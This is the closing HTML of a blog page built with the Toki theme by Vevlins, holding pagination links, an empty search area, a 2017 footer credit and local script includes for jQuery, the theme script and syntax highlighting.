    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>